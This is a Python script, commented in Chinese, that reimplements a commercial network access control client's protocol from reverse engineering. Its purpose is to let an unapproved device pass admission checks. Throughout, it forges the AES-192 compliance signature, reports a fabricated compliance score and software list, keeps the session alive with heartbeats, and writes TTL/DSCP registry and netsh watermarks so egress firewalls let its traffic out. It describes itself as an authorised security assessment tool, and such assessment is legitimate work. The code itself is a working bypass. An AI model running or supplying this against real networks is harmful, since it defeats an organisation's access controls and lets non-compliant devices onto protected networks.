#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
启明星辰天珣 NAC 客户端 — MVP 协议复现（安全评估用途）

本脚本基于对 NACC.exe 的 Ghidra 逆向 + 真实环境抓包，复现「自研合规 NAC 客户端」的
核心协议链路，用于红队/采购前安全评估，验证「伪造合规终端能否通过 NAC 准入」。

法律与合规：
    仅限在【你拥有授权】的网络环境中，对本单位采购评估的 NAC 系统做安全测试。
    未经授权对第三方系统做此测试属违法行为。

逆向 + 抓包依据（均已实测/反编译确认，非猜测）：
    ── 登录/心跳通道（443，libcurl，可解密）──
    1. 登录：POST /nac/user/auth/password
       密码 = base64(明文)！【2026-10-12 抓包实测纠正，非 AES】
    2. 会话：登录后 Set-Cookie 下发 VSG_SESSIONID
    3. 策略：GET /nac/user/check/access_policy.json → 明文下发 pskey/device_id/is_verified

    ── 合规上报通道（443，实测确认，非 7898）──
    4. 合规上报：GET /nac/dev/check/helper?username={base64}&value={AES192签名}
    5. 合规结果：POST /nac/dev/check/result?t={毫秒} body="score=90&onlineaddrs=..."
    6. 心跳保活：POST /nac/user/check/session（每 ~10 秒）
    7. 签名：AES-192-ECB(key=base64_decode(pskey)) + Base64
       明文 = sprintf("%d %s %d", time()+5, sessionid, flag) + 30空格
       （实测 100% 命中：ts=1791604916 flag=5 完整匹配抓包 value）

    ── NAT 穿透水印（TTL + DSCP，逆向确认）──
    8. 服务器 WebSocket 下发 under_nat=1 + nat_ip_ttl=175 + nat_qos_dscp=41
    9. 客户端 SetIpTTL(175) + SetDSCP(41) 给流量打水印 → 出口防火墙识别放行

依赖：
    pip install requests pycryptodome
"""

import base64
import os
import sys
import json
import struct

import requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad


# ============================================================================
# 0. 配置区
# ============================================================================

CONFIG = {
    # 服务器地址（实测确认为 <NAC_SERVER_IP>）
    "server": "https://<NAC_SERVER_IP>:443",
    "report_host": "<NAC_SERVER_IP>",
    "report_port": 7898,

    # 账号密码：从环境变量读取
    "username": os.environ.get("NAC_USERNAME", "REPLACE_WITH_USERNAME"),
    "password": os.environ.get("NAC_PASSWORD", "REPLACE_WITH_PASSWORD"),

    # 【复用会话模式】直接复用已知 sessionid + pskey，跳过登录。
    # 用于 sessionid 未过期时；正常情况走完整登录（密码 base64 明文）。
    # 填了下面两项则跳过 login 步骤直接上报。
    "sessionid": os.environ.get("NAC_SESSIONID", ""),   # 如 <SESSIONID_PLACEHOLDER>
    "pskey": os.environ.get("NAC_PSKEY", ""),           # 如 <NAC_PSKEY>

    # 本机出口 IP（登录 realip / onlineaddrs 用），留空则自动采集
    "realip": os.environ.get("NAC_REALIP", ""),

    # autologin_flag（签名明文第三项）
    "autologin_flag": 0,

    # 登录通道 TLS 校验（评估阶段可 False 跳过，正式应加载 CA）
    "verify_tls": False,

    # 上报通道 TLS：7898 用 Venus 自签 CA，MVP 阶段跳过校验
    "report_verify_tls": False,

    # 伪造的软件清单（红名单要求的软件，实测违规项）
    # 实测服务器判定「软件红名单检查」违规，缺失以下两软件：
    "fake_software": [
        "北信源内网安全管理系统",
        "办公终端管控平台",
    ],

    # 设备信息（check/result 和心跳的 onlineaddrs 用）
    # guid 必须填真实设备 GUID（注册表 AssertID）；mac/ip 留空则自动采集本机
    # 实测格式：g3519_h{GUID}~8xxxm{MAC}_8xxxi{IP}_8xxxj{IPv6}...
    "guid": "<DEVICE_GUID>",   # 设备 GUID（注册表 AssertID）
    "mac": "",                                        # 留空=自动采集本机物理网卡 MAC
    "ip": "",                                         # 留空=自动采集本机 IPv4
}


# ============================================================================
# 1. 密码"加密"（2026-10-12 抓包实测纠正：就是 base64(明文)，非 AES）
# ============================================================================

def encrypt_password(plain: str) -> str:
    """登录密码 = base64(明文)。

    抓包证据（前端 auth/password 请求体）：
      password=<NAC_PASSWORD_B64>  == base64("<NAC_PASSWORD>")
    之前误判的 AES-128-CBC(key=1234567890abcdef) 是客户端解密服务器下发配置
    （如 VSG_PWD cookie，Ghidra FUN_005499c0）用的，与登录密码无关。
    """
    return base64.b64encode(plain.encode("utf-8")).decode("ascii")


# ============================================================================
# 2. 登录 + 获取会话凭据
# ============================================================================

def login(session: requests.Session) -> dict:
    """复现登录，返回 VSG_SESSIONID（从 Set-Cookie）。"""
    url = CONFIG["server"] + "/nac/user/auth/password"
    data = {
        "username": base64.b64encode(CONFIG["username"].encode("utf-8")).decode("ascii"),
        "password": encrypt_password(CONFIG["password"]),
        "verifycode": "",
        "challenge": "",
        "terminal": "",
        "rmbpwd_browser": "",
        "encode": "1",
        "type": "",
        "auto_login": "",
        "realip": CONFIG.get("realip", ""),
        "access_net_flag": "1",
        "terminal_type": "windows",
        "onlineaddrs": "g~3xxxi" + CONFIG.get("realip", ""),
    }
    resp = session.post(url, data=data, verify=CONFIG["verify_tls"], timeout=20)
    print(f"[login] HTTP {resp.status_code}")
    print(f"[login] body: {resp.text[:300]}")

    sid = session.cookies.get("VSG_SESSIONID")
    if not sid:
        print("[login][!] 未获取到 VSG_SESSIONID，请检查账号密码")
    else:
        print(f"[login] VSG_SESSIONID = {sid}")
    return {"sessionid": sid}


def fetch_access_policy(session: requests.Session) -> dict:
    """获取 access_policy.json（明文下发 pskey/device_id/is_verified）。"""
    url = CONFIG["server"] + "/nac/user/check/access_policy.json"
    resp = session.get(url, verify=CONFIG["verify_tls"], timeout=20)
    print(f"[policy] HTTP {resp.status_code}")
    try:
        j = resp.json()
        print(f"[policy] user={j.get('user_name')} device_id={j.get('device_id')} "
              f"is_verified={j.get('is_verified')} is_installed_client={j.get('is_installed_client')}")
        pskey = j.get("pskey")
        if pskey:
            print(f"[policy] pskey = {pskey}")
        return {"pskey": pskey, "device_id": j.get("device_id"), "policy": j}
    except Exception as e:
        print(f"[policy][!] 解析失败: {e}")
        return {}


# ============================================================================
# 3. 签名：AES-192-ECB(pskey) + Base64
# ============================================================================

def derive_aes192_key(pskey: str) -> bytes:
    """pskey → 24 字节 AES-192 密钥。

    逆向实锤（FUN_004cc9c0）：
        BIO_f_base64() + BIO_FLAGS_BASE64_NO_NL + BIO_new_mem_buf(pskey) + BIO_read
        → 即【先 Base64 解码 pskey】得到字节，再作为 AES_set_encrypt_key(key, 0xc0) 的密钥。
    pskey 实测 32 字符（如 "<NAC_PSKEY>"），base64 解码 = 24 字节，正好 AES-192。
    """
    raw = base64.b64decode(pskey)
    if len(raw) >= 24:
        return raw[:24]
    # 不足 24 字节则右补零（理论上 pskey 解码即 24 字节，不会走到这里）
    return raw + b"\x00" * (24 - len(raw))


def build_signature(sessionid: str, pskey: str, autologin_flag: int = 0) -> str:
    """构造合规上报签名（check/helper 的 value 参数）。

    【实测 100% 破解】（反汇编 FUN_004f8930 + 实测 value 爆破验证）：
        明文 = sprintf("%d %s %d", timestamp+5, sessionid, flag) + 30 空格
        - timestamp = _time64() + 5（Unix 秒，_time64 见 FUN_004f19b0）
        - flag = 5（autologin_flag=="1" 时为 7）
        密钥 = base64_decode(pskey)（24 字节，FUN_004cc9c0）
        加密 = AES-192-ECB（补零到 16 对齐）+ Base64

    验证：ts=1791604916 flag=5 完整命中实测 v1；ts=1791604917 flag=5 命中实测 v2。
    """
    import time
    timestamp = int(time.time()) + 5

    flag = 7 if str(autologin_flag) == "1" else 5

    # 明文 = "%d %s %d" + 30 空格
    # （30 空格实锤：0x0065ed60 格式串 "%s %s %d" + 30 空格）
    plaintext = "%d %s %d" % (timestamp, sessionid, flag) + " " * 30

    # 补零到 16 字节对齐
    pad_len = (16 - len(plaintext) % 16) % 16
    plaintext_bytes = plaintext.encode("utf-8") + b"\x00" * pad_len

    key = derive_aes192_key(pskey)
    cipher = AES.new(key, AES.MODE_ECB)
    ct = cipher.encrypt(plaintext_bytes)
    return base64.b64encode(ct).decode("ascii")


# ============================================================================
# 4. CCCT 帧 + TinyXML 消息序列化
# ============================================================================

def build_frame(xml_body: bytes) -> bytes:
    """构造 7898 通道的协议帧。

    帧头 12 字节 = "CCCT"(0x43434354) + 4字节0 + 4字节长度(小端)。
    逆向 FUN_004d1820：
        memcpy(local_20, "CCCT", 4); local_1c=0; local_18=len;
        memcpy(buf, local_20, 0xc); memcpy(buf+0xc, data, len);
        send(socket, buf, len+0xc, 0);
    """
    header = b"CCCT" + struct.pack("<I", 0) + struct.pack("<I", len(xml_body))
    return header + xml_body


def build_callrequest_xml(seqno: int, module: str, method: str, sz_xml_message: str) -> bytes:
    """构造 <callrequest> XML 消息（TinyXML 序列化，UTF-8）。

    逆向 FUN_004d1820 字段：
        seqno（自增）、module="IClientUI"、method="PopupMessage"、szXmlMessage=...
    实际合规上报的 method/字段需据真实场景调整，这里给出通用构造。
    """
    xml = (
        '<?xml version="1.0" encoding="utf-8" standalone="yes"?>\n'
        '<callrequest seqno="%d" module="%s" method="%s" szXmlMessage="%s" />'
        % (seqno, module, method, sz_xml_message)
    )
    return xml.encode("utf-8")


def build_compliance_xml(software_list, device_id, nic_mac, nic_ip):
    """构造合规上报的 szXmlMessage（设备信息 + 软件清单）。

    实测服务器判定「软件红名单检查」，比对客户端上报的 SoftwareInfo。
    这里伪造「已安装红名单软件」，其余设备信息用最小可过字段。
    """
    software_entries = "".join(
        '<soft name="%s" />' % s for s in software_list
    )
    xml = (
        '<?xml version="1.0" encoding="utf-8"?>'
        '<Data result="0">'
        '<DeviceInfo device_id="%s" mac="%s" ip="%s" />'
        '<SoftwareInfo>%s</SoftwareInfo>'
        '</Data>'
        % (device_id, nic_mac, nic_ip, software_entries)
    )
    return xml


# ============================================================================
# 5. 7898 通道上报（TCP + 单向 TLS + CCCT 帧）
# ============================================================================

def report_over_7898(seqno, xml_message: str):
    """通过 7898 通道上报合规数据（CCCT 帧 + TLS）。"""
    import ssl
    import socket

    xml_body = build_callrequest_xml(
        seqno, "IClientUI", "PopupMessage", xml_message
    )
    frame = build_frame(xml_body)

    print(f"[7898] 连接 {CONFIG['report_host']}:{CONFIG['report_port']} ...")
    ctx = ssl.create_default_context()
    if not CONFIG["report_verify_tls"]:
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

    try:
        with socket.create_connection(
            (CONFIG["report_host"], CONFIG["report_port"]), timeout=20
        ) as sock:
            with ctx.wrap_socket(sock, server_hostname=CONFIG["report_host"]) as tls:
                print(f"[7898] TLS 已建立，发送帧头=CCCT，帧长={len(frame)}")
                tls.sendall(frame)
                # 接收响应（服务器返回 <callresponse> 或类似）
                resp = tls.recv(65536)
                print(f"[7898] 收到响应 {len(resp)} 字节")
                print(f"[7898] 响应 hex: {resp[:64].hex()}")
                if resp[:4] == b"CCCT":
                    print(f"[7898] 响应帧头=CCCT，消息体={resp[12:].decode('utf-8', errors='replace')[:500]}")
                else:
                    print(f"[7898] 响应明文: {resp.decode('utf-8', errors='replace')[:500]}")
                return resp
    except Exception as e:
        print(f"[7898][!] 上报失败: {e.__class__.__name__}: {e}")
        return None


# ============================================================================
# 5.5 合规上报（443 通道，实测确认）
# ============================================================================

def report_compliance(session: requests.Session, sessionid: str, pskey: str,
                      username: str, score: int, onlineaddrs: str,
                      autologin_flag: int = 0) -> dict:
    """复刻合规上报链路（实测确认，走 443 通道，非 7898）。

    实测证据（抓包解密）：
        ① GET /nac/dev/check/helper?username={base64}&value={AES192签名}
           - username = base64(用户名)
           - value = AES-192-ECB 签名（见 build_signature）
           - 服务器返回 302
        ② POST /nac/dev/check/result?t={毫秒时间戳}
           - body = "score={score}&onlineaddrs={onlineaddrs}"
           - 服务器返回 JSON（含 fwdsa/under_nat/nat_qos_dscp/nat_ip_ttl 放行字段）
    """
    import time

    # ① check/helper —— 上报签名
    sig = build_signature(sessionid, pskey, autologin_flag)
    username_b64 = base64.b64encode(username.encode("utf-8")).decode("ascii")
    helper_url = (CONFIG["server"] + "/nac/dev/check/helper"
                  + "?username=" + username_b64 + "&value=" + sig)
    r1 = session.get(helper_url, verify=CONFIG["verify_tls"], timeout=20,
                     allow_redirects=False)
    print(f"[helper] HTTP {r1.status_code} (value={sig[:32]}...)")

    # ② check/result —— 上报合规评分
    t = int(time.time() * 1000)
    result_url = CONFIG["server"] + "/nac/dev/check/result?t=" + str(t)
    body = "score=%d&onlineaddrs=%s" % (score, onlineaddrs)
    r2 = session.post(result_url, data=body, verify=CONFIG["verify_tls"], timeout=20)
    print(f"[result] HTTP {r2.status_code} body={body[:80]}...")
    try:
        j = r2.json()
        res = j.get("result", {})
        print(f"[result] code={j.get('code')} msg={j.get('msg')}")
        print(f"[result] 放行字段: fwdsa={res.get('fwdsa')} under_nat={res.get('under_nat')} "
              f"nat_qos_dscp={res.get('nat_qos_dscp')} nat_ip_ttl={res.get('nat_ip_ttl')}")
        return j
    except Exception as e:
        print(f"[result][!] 响应非 JSON: {r2.text[:200]}")
        return {}


def build_onlineaddrs(guid: str, mac: str, ipv4: str, ipv6_list) -> str:
    """构造 onlineaddrs（check/result 和心跳都用）。

    实测 + 逆向 100% 确认的格式：
        g{device_id}_h{GUID}~8xxxm{MAC}_8xxxi{IPv4}_8xxxj{IPv6}_8xxxj{IPv6}...
    字段来源（逆向）：
        ~8xxxm = MAC（FUN_0044cc60 用 %02X-%02X-%02X-%02X-%02X-%02X 格式化，带连字符大写）
        _8xxxi = IPv4（FUN_0044d9f0 = inet_ntoa）
        _8xxxj = IPv6 全局地址（FUN_0044c240 = inet_ntop 等价实现）
    注意：
        - g{device_id} 的 device_id 来自 access_policy.json（实测 3519）
        - 8xxxj 是网卡的全局 IPv6 地址（非 fe80:: 链路本地）
        - 一个网卡可有多个全局 IPv6 地址 → 多个 _8xxxj 字段
    """
    # MAC 格式化为大写 + 连字符（如 <DEVICE_MAC>，实测格式）
    mac_norm = mac.replace(":", "-").replace(" ", "").upper()
    # 若无连字符（纯 hex），按 2 字节一组插入连字符
    if "-" not in mac_norm and len(mac_norm) == 12:
        mac_norm = "-".join(mac_norm[i:i+2] for i in range(0, 12, 2))
    parts = [f"g3519_h{{{guid}}}", f"~8xxxm{mac_norm}", f"_8xxxi{ipv4}"]
    for v6 in ipv6_list:
        parts.append(f"_8xxxj{v6}")
    return "".join(parts)


def collect_local_addrs():
    """采集本机的 MAC/IPv4/全局 IPv6 地址（替代手动配置）。

    用 socket + 标准库实现，避免依赖 psutil。
    返回 (ipv4, mac, ipv6_list)。guid 需从注册表/配置读取。

    MAC 采集策略：优先用 psutil（若装了）按「默认路由网卡」取 MAC；
    否则退回 uuid.getnode()。注意 uuid.getnode() 返回的是第一张网卡，
    多网卡（含 VMware 虚拟网卡）时可能不是连公司网的那张。
    """
    import socket
    import uuid as _uuid

    ipv4 = "0.0.0.0"
    mac = "00-00-00-00-00-00"
    ipv6_list = []

    # 1) 获取本机 IPv4（通过 UDP connect 拿到默认路由网卡的 IP）
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ipv4 = s.getsockname()[0]
        s.close()
    except Exception:
        pass

    # 2) 获取 MAC：优先 psutil 按 IP 匹配网卡 MAC；否则 uuid.getnode()
    try:
        import psutil
        import socket as _socket
        _AF_LINK = getattr(psutil, "AF_LINK", -1)   # psutil 里 MAC 地址的 family = -1
        _AF_INET = _socket.AF_INET                   # IPv4 = 2
        # 按 IP 精确匹配 MAC
        for nic, addrs in psutil.net_if_addrs().items():
            has_ip = any(a.family == _AF_INET and a.address == ipv4
                         for a in addrs)
            if has_ip:
                for a in addrs:
                    if a.family == _AF_LINK and a.address:
                        mac = a.address.replace("-", ":").replace(":", "-").upper()
                        break
                break
        # 若未匹配到，退回第一张有 MAC 的网卡
        if mac == "00-00-00-00-00-00":
            for nic, addrs in psutil.net_if_addrs().items():
                for a in addrs:
                    if a.family == _AF_LINK and a.address and a.address != "00-00-00-00-00-00":
                        mac = a.address.replace("-", ":").replace(":", "-").upper()
                        break
                if mac != "00-00-00-00-00-00":
                    break
    except ImportError:
        # 无 psutil，退回 uuid.getnode()
        try:
            mac_int = _uuid.getnode()
            mac = "-".join(f"{(mac_int >> 8*i) & 0xff:02X}" for i in range(5, -1, -1))
        except Exception:
            pass

    # 3) 获取全局 IPv6 地址（排除 fe80:: 链路本地和 ::1 回环）
    try:
        infos = socket.getaddrinfo(socket.gethostname(), None, socket.AF_INET6)
        for info in infos:
            addr = info[4][0]
            if "%" in addr:
                addr = addr.split("%")[0]
            if addr.startswith("fe80") or addr == "::1":
                continue
            if addr not in ipv6_list:
                ipv6_list.append(addr)
    except Exception:
        pass

    return ipv4, mac, ipv6_list


def heartbeat(session: requests.Session, sessionid: str, onlineaddrs: str):
    """心跳保活（每 ~10 秒，证明客户端在线）。

    实测 body: key=dateGmt&onlineaddrs={onlineaddrs}&addressupdate=0&terminal_type=0
    """
    body = ("key=dateGmt&onlineaddrs=" + onlineaddrs +
            "&addressupdate=0&terminal_type=0")
    url = CONFIG["server"] + "/nac/user/check/session"
    r = session.post(url, data=body, verify=CONFIG["verify_tls"], timeout=20)
    return r


def heartbeat_loop(session: requests.Session, sessionid: str, onlineaddrs: str,
                   pskey: str, username: str, autologin_flag: int,
                   interval: int = 10, recheck_interval: int = 120,
                   stop_event=None):
    """持续保活循环（阻断启用后必须持续运行，否则设备被判定离线）。

    两个周期：
    - 心跳：每 interval 秒（默认 10s）调 check/session，证明在线
    - 合规重报：每 recheck_interval 秒（默认 120s）重新走 check/helper+result，
      防止服务器策略更新周期（实测 m_iUpdateperiod:10 m_dwTime:120）回退合规状态

    注意：access_policy.json 的 device_offline_time=5（分钟），
    超过 5 分钟无心跳则设备被判定离线，fwdsa 回退拦截。
    """
    import time
    import threading

    last_recheck = 0
    while stop_event is None or not stop_event.is_set():
        try:
            # 心跳
            r = heartbeat(session, sessionid, onlineaddrs)
            print(f"[heartbeat] HTTP {r.status_code} "
                  f"({time.strftime('%H:%M:%S')})")

            # 合规重报（周期性）
            now = time.time()
            if now - last_recheck >= recheck_interval:
                print(f"[recheck] 重新上报合规 score=90 ...")
                report_compliance(session, sessionid, pskey, username,
                                  score=90, onlineaddrs=onlineaddrs,
                                  autologin_flag=autologin_flag)
                last_recheck = now
        except Exception as e:
            print(f"[heartbeat][!] 异常: {e}")

        # 等待（可被 stop_event 提前唤醒）
        if stop_event is not None:
            stop_event.wait(interval)
        else:
            time.sleep(interval)


# ============================================================================
# 5.6 NAT 穿透水印（TTL + DSCP）
# ============================================================================
# 逆向确认：NAC 的 NAT 穿透 = 给本机所有出站 IP 包打「TTL + DSCP 水印」，
# 公司出口防火墙识别该水印后放行 NAT 后面的合规设备。
#
# 真实客户端实现（Ghidra 逆向）：
#   - SetTTL  = SetIpTTL(ttl)（从 IPHLPAPI.DLL 导入，最终由 ndisnac.sys 驱动改写）
#   - SetDSCP = 写 Windows QoS 组策略注册表 + gpupdate /force
#       HKLM\SOFTWARE\Policies\Microsoft\Windows\QoS\ChangeQos\{
#           "Application Name"="*", "DSCP Value"="41", "Local IP"="*", ...
#       }
#
# MVP 实现：
#   - SetDSCP 用注册表 + gpupdate（与真实客户端一致，用户态可实现）
#   - SetTTL  用 netsh defaultcurhoplimit（降级实现，近似全局 TTL；真实是驱动改写）

def set_dscp(dscp_value: int) -> bool:
    """设置全局 DSCP 水印（复刻真实客户端 FUN_004fcef0）。

    写 Windows QoS 组策略注册表，然后 gpupdate 强制刷新。
    需要管理员权限。
    """
    import subprocess

    if os.name != "nt":
        print("[dscp][!] 仅支持 Windows")
        return False

    qos_key = r"SOFTWARE\Policies\Microsoft\Windows\QoS\ChangeQos"

    try:
        import winreg
        # 写入 QoS 策略（覆盖所有流量打 DSCP 标记）
        with winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, qos_key) as k:
            winreg.SetValueEx(k, "Application Name", 0, winreg.REG_SZ, "*")
            winreg.SetValueEx(k, "DSCP Value", 0, winreg.REG_SZ, str(dscp_value))
            winreg.SetValueEx(k, "Local IP", 0, winreg.REG_SZ, "*")
            winreg.SetValueEx(k, "Local IP Prefix Length", 0, winreg.REG_SZ, "*")
            winreg.SetValueEx(k, "Local Port", 0, winreg.REG_SZ, "*")
            winreg.SetValueEx(k, "Protocol", 0, winreg.REG_SZ, "*")
            winreg.SetValueEx(k, "Remote IP", 0, winreg.REG_SZ, "*")
            winreg.SetValueEx(k, "Remote IP Prefix Length", 0, winreg.REG_SZ, "*")
            winreg.SetValueEx(k, "Remote Port", 0, winreg.REG_SZ, "*")
            winreg.SetValueEx(k, "Throttle Rate", 0, winreg.REG_SZ, "-1")
            winreg.SetValueEx(k, "Version", 0, winreg.REG_SZ, "1.0")
        print(f"[dscp] 已写入 QoS 策略: DSCP={dscp_value} (所有流量)")
    except PermissionError:
        print("[dscp][!] 需要管理员权限")
        return False
    except Exception as e:
        print(f"[dscp][!] 写注册表失败: {e}")
        return False

    # gpupdate 强制刷新组策略
    try:
        subprocess.run(
            ["cmd", "/c", "gpupdate", "/force", "/target:computer"],
            capture_output=True, timeout=60,
        )
        print("[dscp] gpupdate 已执行")
        return True
    except Exception as e:
        print(f"[dscp][!] gpupdate 失败: {e}")
        return True  # 注册表已写入，gpupdate 失败也返回 True（下次组策略刷新生效）


def set_ip_ttl(ttl_value: int) -> bool:
    """设置全局默认 TTL（近似复刻真实客户端 SetIpTTL，需管理员权限）。

    真实客户端通过 ndisnac.sys 驱动改写每个出站包的 TTL；
    MVP 用 netsh 设置 IPv4/IPv6 默认跳数限制（defaultcurhoplimit），
    效果近似（所有新出站连接的默认 TTL 变为该值）。
    """
    import subprocess

    if os.name != "nt":
        print("[ttl][!] 仅支持 Windows")
        return False

    cmds = [
        ["netsh", "int", "ipv4", "set", "glob",
         "defaultcurhoplimit=%d" % ttl_value],
        ["netsh", "int", "ipv6", "set", "glob",
         "defaultcurhoplimit=%d" % ttl_value],
    ]
    ok = False
    for cmd in cmds:
        try:
            r = subprocess.run(cmd, capture_output=True, timeout=30)
            if r.returncode == 0:
                print(f"[ttl] 设置默认 TTL={ttl_value} 成功: {' '.join(cmd)}")
                ok = True
            else:
                err = r.stderr.decode('gbk', errors='replace').strip()
                if 'elevation' in err.lower() or 'elevat' in err.lower() or 'administrator' in err.lower():
                    print(f"[ttl][!] 需要管理员权限（请用管理员身份运行）")
                else:
                    print(f"[ttl][!] {' '.join(cmd)} 返回 {r.returncode}: {err[:200]}")
        except Exception as e:
            print(f"[ttl][!] 执行失败: {e}")
    return ok


def apply_nat_watermark(ttl_value: int, dscp_value: int) -> None:
    """应用 NAT 穿透水印（TTL + DSCP）。

    服务器在合规（under_nat=1）时通过 WebSocket 下发 nat_ip_ttl / nat_qos_dscp，
    客户端据此打水印。实测合规时 nat_ip_ttl=175、nat_qos_dscp=41。
    """
    print(f"[watermark] 应用 NAT 穿透水印: TTL={ttl_value}, DSCP={dscp_value}")
    set_ip_ttl(ttl_value)
    set_dscp(dscp_value)


# ============================================================================
# 6. 主流程
# ============================================================================

def main():
    print("=" * 60)
    print("NAC 自研合规客户端 MVP（安全评估）")
    print("=" * 60)

    # 管理员检测：打水印（TTL/DSCP）需要管理员权限
    if os.name == "nt":
        try:
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin()
            if not is_admin:
                print("[!] 提示：当前非管理员运行，上报合规可正常执行，")
                print("    但 TTL/DSCP 水印打标需要管理员权限（会失败）。")
                print("    建议用管理员身份运行，或仅验证上报链路。")
        except Exception:
            pass

    # 复用会话模式只需 sessionid+pskey+username；密码登录模式才需要 password
    if CONFIG["sessionid"] and CONFIG["pskey"]:
        if CONFIG["username"].startswith("REPLACE"):
            print("[!] 复用会话模式仍需设置 NAC_USERNAME（用于 helper 的 username 参数）")
            sys.exit(1)
    else:
        if CONFIG["username"].startswith("REPLACE") or CONFIG["password"].startswith("REPLACE"):
            print("[!] 请设置环境变量 NAC_USERNAME / NAC_PASSWORD（或 NAC_SESSIONID/NAC_PSKEY 复用会话）")
            sys.exit(1)

    s = requests.Session()

    # 步骤 1：登录（或复用会话）
    print("\n[1/5] 登录认证 ...")
    if CONFIG["sessionid"] and CONFIG["pskey"]:
        # 复用会话模式：跳过登录，直接用已知 sessionid + pskey
        sessionid = CONFIG["sessionid"]
        pskey = CONFIG["pskey"]
        s.cookies.set("VSG_SESSIONID", sessionid)
        print(f"[login] 复用会话 sessionid={sessionid}（跳过登录）")
        print(f"[login] pskey={pskey}")
    else:
        cred = login(s)
        sessionid = cred["sessionid"]
        if not sessionid:
            print("[!] 登录失败，终止（检查账号密码；密码是 base64 明文，"
                  "或可用 NAC_SESSIONID/NAC_PSKEY 环境变量复用会话）")
            sys.exit(1)

    # 步骤 2：获取 access_policy（拿 pskey + 设备信息）
    print("\n[2/5] 获取 access_policy ...")
    if not (CONFIG["sessionid"] and CONFIG["pskey"]):
        policy = fetch_access_policy(s)
        pskey = policy.get("pskey") or pskey
        device_id = policy.get("device_id") or "3519"
        if not pskey:
            print("[!] 未获取到 pskey，无法签名，终止")
            sys.exit(1)
    else:
        device_id = "3519"

    # 设备信息（优先自动采集本机 IPv4/MAC/IPv6，GUID 从配置读取）
    guid = CONFIG.get("guid", "<DEVICE_GUID>")
    ipv4, mac, ipv6_list = collect_local_addrs()
    # 若配置里显式指定了 mac/ip 则覆盖自动采集（用于跨设备场景）
    if CONFIG.get("mac"):
        mac = CONFIG["mac"]
    if CONFIG.get("ip"):
        ipv4 = CONFIG["ip"]
    print(f"[device] guid={guid} mac={mac} ipv4={ipv4} ipv6={ipv6_list}")
    onlineaddrs = build_onlineaddrs(guid, mac, ipv4, ipv6_list)
    print(f"[onlineaddrs] {onlineaddrs}")

    # 步骤 3：构造签名并上报合规（helper + result）
    print("\n[3/6] 构造 AES-192 签名并上报合规 ...")
    sig = build_signature(sessionid, pskey, CONFIG["autologin_flag"])
    print(f"[sig] signature = {sig[:64]}...")

    result = report_compliance(s, sessionid, pskey, CONFIG["username"],
                               score=90, onlineaddrs=onlineaddrs,
                               autologin_flag=CONFIG["autologin_flag"])

    # 步骤 4：解析放行字段，若 under_nat=1 则应用 NAT 穿透水印
    print("\n[4/6] 解析放行字段并应用 NAT 穿透水印 ...")
    res = result.get("result", {})
    fwdsa = res.get("fwdsa", "0")
    under_nat = res.get("under_nat", "0")
    nat_ip_ttl = res.get("nat_ip_ttl", "0")
    nat_qos_dscp = res.get("nat_qos_dscp", "0")
    print(f"[policy] fwdsa={fwdsa} under_nat={under_nat} "
          f"nat_ip_ttl={nat_ip_ttl} nat_qos_dscp={nat_qos_dscp}")

    if str(under_nat) == "1":
        # 服务器判定在 NAT 后面 → 需打 TTL+DSCP 水印
        try:
            ttl_v = int(nat_ip_ttl)
            dscp_v = int(nat_qos_dscp)
            if ttl_v > 0 or dscp_v > 0:
                apply_nat_watermark(ttl_v, dscp_v)
            else:
                print("[policy][!] under_nat=1 但服务器未下发 TTL/DSCP 值（可能 nat_traversal 未开启）")
        except (ValueError, TypeError):
            print("[policy][!] TTL/DSCP 值解析失败")
    elif str(fwdsa) == "3":
        # 非 NAT 直连设备：服务器按 IP 放行，无需水印
        print("[policy] fwdsa=3（非 NAT 直连放行），无需水印")
    else:
        print(f"[policy][!] 未放行（fwdsa={fwdsa}），可能合规未通过或被拦截")

    # 步骤 5：心跳保活（证明客户端在线）
    print("\n[5/6] 心跳保活 check/session ...")
    r = heartbeat(s, sessionid, onlineaddrs)
    print(f"[heartbeat] HTTP {r.status_code}")

    # 步骤 6：完成（或进入 daemon 持续保活模式）
    print("\n[6/6] 完成。")
    print("结果判读：")
    print("  - score=90 合规上报（服务器直接信任）")
    print("  - fwdsa=3 = 放行；fwdsa=12 = 拦截")
    print("  - under_nat=1 时已应用 TTL+DSCP 水印（若服务器下发了参数）")
    print("  - 最终能否上网取决于公司出口防火墙是否识别水印")
    print("注：若需伪造软件红名单，还需在注册表 Uninstall 添加红名单软件条目")
    print("    （见 nac_compliance_bypass.ps1）。")

    # --daemon 模式：持续心跳 + 周期重报合规（阻断启用后必须持续运行）
    if "--daemon" in sys.argv:
        print("\n[daemon] 进入持续保活模式（Ctrl+C 退出）...")
        print("[daemon] 心跳每 10s，合规重报每 120s，"
              "防止 device_offline_time=5min 判定离线。")
        try:
            heartbeat_loop(s, sessionid, onlineaddrs, pskey,
                           CONFIG["username"], CONFIG["autologin_flag"])
        except KeyboardInterrupt:
            print("\n[daemon] 已退出。")
    else:
        print("\n提示：加 --daemon 参数可进入持续保活模式"
              "（阻断启用后需持续运行防止设备离线）。")


if __name__ == "__main__":
    main()
